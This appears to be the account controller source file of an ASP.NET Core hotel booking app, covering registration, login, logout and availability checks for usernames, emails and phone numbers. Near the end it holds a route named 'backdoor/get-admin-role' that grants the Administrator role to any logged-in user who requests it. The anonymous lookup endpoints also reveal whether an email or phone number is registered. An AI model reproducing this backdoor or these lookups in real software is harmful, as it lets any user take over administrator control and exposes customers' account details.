using DotHotel.Core.DataTransferObjects.IdentityObjects;
using DotHotel.Core.Domain.Models.IdentityModels;
using DotHotel.Core.Enums;
using DotHotel.Core.ServiceContracts;
using DotHotel.Presentation.Attributes;
using DotHotel.Presentation.Filters.ActionFilters;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;

namespace DotHotel.Presentation.Controllers
{
    [Route("account")]
    public class AccountController : Controller
    {
        private readonly UserManager<ApplicationUser> _userManager;
        private readonly SignInManager<ApplicationUser> _signInManager;
        private readonly RoleManager<ApplicationRole> _roleManager;
        private readonly IUserRoleService _userRoleService;

        public AccountController(UserManager<ApplicationUser> userManager, SignInManager<ApplicationUser> signInManager, RoleManager<ApplicationRole> roleManager, IUserRoleService userRoleService)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _roleManager = roleManager;
            _userRoleService = userRoleService;
        }

        [HttpGet]
        [Authorize(Policy = "NotAuthorized")]
        [Route("register")]
        public IActionResult Register()
        {
            return View();
        }

        [HttpPost]
        [Authorize(Policy = "NotAuthorized")]
        [TypeFilter(typeof(ReturnModelOnValidationFailActionFilter))]
        [Route("register")]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Register([ReturnOnValidationFail] RegisterObject registerObject)
        {
            var user = registerObject.ToApplicationUser();

            var result = await _userManager.CreateAsync(user, registerObject.Password);

            if (result.Succeeded)
            {
                await _signInManager.SignInAsync(user, isPersistent: false);

                await _userRoleService.AttachRoleToUser(user, UserRoles.Customer);

                return RedirectToAction("Index", "Home");
            }

            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("RegisterError", error.Description);
            }

            return View(registerObject);
        }

        [HttpGet]
        [Authorize(Policy = "NotAuthorized")]
        [Route("login")]
        public IActionResult Login()
        {
            return View();
        }

        [HttpPost]
        [Authorize(Policy = "NotAuthorized")]
        [TypeFilter(typeof(ReturnModelOnValidationFailActionFilter))]
        [Route("login")]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Login(LoginObject loginObject)
        {
            var result = await _signInManager.PasswordSignInAsync(loginObject.UserName, loginObject.Password, false, false);

            if (result.Succeeded)
            {
                return RedirectToAction("Index", "Home");
            }

            ModelState.AddModelError("LoginError", "Invalid login attempt");

            return View(loginObject);
        }

        [HttpGet]
        [Authorize]
        [Route("logout")]
        public async Task<IActionResult> Logout()
        {
            await _signInManager.SignOutAsync();

            return RedirectToAction("Index", "Home");
        }

        [AllowAnonymous]
        [Route("api/is-username-free")]
        public IActionResult IsUsernameFree(string username)
        {
            ApplicationUser? user = _userManager.Users.FirstOrDefault(u => u.UserName == username);
            if (user == null)
            {
                return Json(true);
            }
            else
            {
                return Json(false);
            }
        }

        [AllowAnonymous]
        [Route("api/is-email-free")]
        public IActionResult IsEmailFree(string email)
        {
            ApplicationUser? user = _userManager.Users.FirstOrDefault(u => u.Email == email);
            if (user == null)
            {
                return Json(true);
            }
            else
            {
                return Json(false);
            }
        }

        [AllowAnonymous]
        [Route("api/is-phone-number-free")]
        public IActionResult IsPhoneNumberFree(string phoneNumber)
        {
            ApplicationUser? user = _userManager.Users.FirstOrDefault(u => u.PhoneNumber == phoneNumber);
            if (user == null)
            {
                return Json(true);
            }
            else
            {
                return Json(false);
            }
        }

        [Authorize]
        [Route("backdoor/get-admin-role")]
        public async Task<IActionResult> GetAdminRole()
        {
            var user = await _userManager.GetUserAsync(User);

            if (user == null)
            {
                throw new ArgumentException("User not found.", nameof(user));
            }

            await _userRoleService.AttachRoleToUser(user, UserRoles.Administrator);

            return RedirectToAction("Index", "Home");
        }
    }
}
